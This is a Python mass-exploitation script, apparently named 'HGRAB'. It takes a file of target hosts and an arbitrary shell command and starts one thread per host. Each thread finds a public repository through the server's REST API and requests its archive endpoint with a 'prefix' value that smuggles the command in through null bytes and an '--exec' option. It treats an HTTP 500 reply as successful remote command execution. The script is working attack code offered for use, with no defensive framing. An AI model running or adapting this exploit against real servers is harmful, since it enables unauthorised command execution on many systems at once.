import requests
import urllib3
import string
import sys
import colored
import time
from datetime import datetime
import random
import threading
from colored import stylize

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Main():
    def formatConsoleDate( date ):
        return '[' + date.strftime('%Y-%m-%d-%H:%M:%S') + ']'
        pass

    def randomString( size ):
        return ''.join(random.choice(string.ascii_letters) for _ in range(size))
        pass

class Exploit:
    def __init__(self, host):
        self.host = host
        pass

    def exploit(self):
        global params
        randomFile = Main.randomString(5)
        try:
            httpResponse = requests.get(f'{self.host}/rest/api/latest/repos', verify=False).json()
            if 'size' not in httpResponse.keys():
                return False
                pass

            if httpResponse['size'] == 0:
                return False
                pass

            for repo in httpResponse['values']:
                if repo['project']['public'] == True:
                    httpResponse = requests.get(f'{self.host}/rest/api/latest/projects/{repo["project"]["key"]}/repos/{repo["slug"]}/archive?filename={randomFile}&at={randomFile}&path={randomFile}&prefix=ax%00--exec=%60{params["command"]}%60%00--remote=origin HTTP/1.1', verify=False)
                    if httpResponse.status_code == 500:
                        print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                            stylize(f" [*] Command executed on {self.host}", colored.fg('green')))
                        pass
                    else:
                        print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                            stylize(f" [*] {self.host} is not vulnerable", colored.fg('red')))
                        pass
                    return False
                    pass
                pass
                
            print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                stylize(f" [*] {self.host} is not vulnerable", colored.fg('red')))
        except:
            pass
        pass

def main():
    global params

    print(stylize('''
                 ╦ ╦╔═╗╦═╗╔═╗╔╗ 
                 ╠═╣║ ╦╠╦╝╠═╣╠╩╗
                 ╩ ╩╚═╝╩╚═╩ ╩╚═╝
            test first, analyze after
    ''', colored.fg('red')))

    if len(sys.argv) < 3:
        print(stylize("""
    [ERROR]""", colored.fg('red'),
                      colored.attr('underlined'))
              + """ bad command usage
            """ + stylize("Usage Sheme:", colored.fg('#ffe900'),
                          colored.attr('underlined')) + """
                - user@some_name:~# python3 main.py <vuln-list> <command>
        """)
        sys.exit()

    params = {}
    params['file'] = sys.argv[1]
    params['command'] = sys.argv[2]

    with open(params['file'], 'r') as file:
        for line in file:
            host = line.strip()
            exploit = Exploit(host)
            threading.Thread(target=exploit.exploit).start()
            pass
        pass
    pass

if __name__ == '__main__':
    main()
